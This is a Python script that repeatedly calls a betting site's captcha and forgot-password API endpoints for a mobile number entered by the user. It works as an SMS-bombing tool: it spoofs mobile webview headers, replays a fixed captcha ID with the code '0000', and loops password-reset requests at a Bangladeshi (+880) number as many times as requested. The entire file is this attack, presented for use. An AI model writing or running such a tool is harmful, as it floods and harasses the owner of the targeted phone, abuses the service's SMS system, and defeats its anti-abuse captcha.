import requests
import json
import time

def make_get_request():
    url = "https://feapi.unicorn88.xyz/api/member/requestCaptchaCode"
    headers = {
        "Host": "feapi.unicorn88.xyz",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36",
        "origin": "https://bhaggo.com",
        "x-requested-with": "com.via.ssl",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://bhaggo.com/login",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US,en;q=0.9"
    }
    params = {
        "captcha_id": "89a60ab4-ab7f-4d99-bb2c-fdfdc1f9e1d7",
        "captcha_code": "0000"
    }

    response = requests.get(url, headers=headers, params=params)

    print("GET Request:")
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)
    print()

def make_post_request(mobile_number):
    url = "https://feapi.unicorn88.xyz/api/member/reqFgtPsw"
    headers = {
        "Host": "feapi.unicorn88.xyz",
        "content-length": "113",
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://bhaggo.com",
        "x-requested-with": "com.via.ssl",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://bhaggo.com/login",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US,en;q=0.9"
    }
    data = {
        "mobile": mobile_number,
        "prefix": "+880",
        "captcha_id": "89a60ab4-ab7f-4d99-bb2c-fdfdc1f9e1d7",
        "captcha_code": "0000"
    }

    json_data = json.dumps(data)
    
    response = requests.post(url, headers=headers, data=json_data)

    print("POST Request for Mobile:", mobile_number)
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)
    print() 

a = str(input("Enter Your Number [Without 880] =>>> : "))
b = int(input("Enter The Amount =>>> : "))

for _ in range(b):
    make_get_request()
    make_post_request(a)
    time.sleep(300)
